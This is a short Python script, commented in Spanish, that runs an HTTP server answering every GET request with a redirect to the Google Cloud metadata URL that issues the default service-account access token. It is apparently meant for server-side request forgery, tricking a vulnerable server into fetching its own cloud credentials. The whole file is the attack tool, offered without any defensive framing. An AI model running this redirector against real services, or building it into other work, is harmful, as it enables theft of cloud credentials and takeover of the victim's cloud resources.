from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Aquí defines el objetivo interno de GCP
        self.send_response(302)
        self.send_header('Location', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')
        self.send_header('Metadata-Flavor', 'Google')
        self.end_headers()

HTTPServer(('', 8080), RedirectHandler).serve_forever()
